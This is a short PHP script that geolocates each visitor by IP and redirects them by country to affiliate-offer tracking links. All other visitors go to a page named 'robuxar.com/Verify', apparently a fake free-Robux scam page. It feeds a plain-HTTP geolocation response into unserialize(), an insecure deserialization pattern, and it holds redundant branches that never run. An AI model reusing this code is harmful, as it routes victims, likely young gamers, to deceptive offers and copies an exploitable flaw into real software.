<?php
 $zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
 $country = $addrDetailsArr['geoplugin_countryName'];

if (strcmp($country, 'United States')==0)
{
      header("location: https://smrturl.co/o/62874/1196338?s1=");
     exit();
} 
else if (strcmp($country, 'United States')==0)
{
      header("location: https://smrturl.co/o/62874/53252800?s1= ");
     exit();
} 

 

else if (strcmp($country, 'Brazil')==0)
{
      header("location: https://smrturl.co/o/62874/53254644?s1= ");
     exit();
} 



else if (strcmp($country, 'United States')==0)
{
      header("location: https://smrturl.co/o/62874/53259337?s1= ");
     exit();
} 





else if (strcmp($country, 'Brazil')==0)
{
      header("location: https://smrturl.co/o/62874/53254644?s1= ");
     exit();
} 

else 
{
      header("location:  https://robuxar.com/Verify ");
     exit();
} 

?>
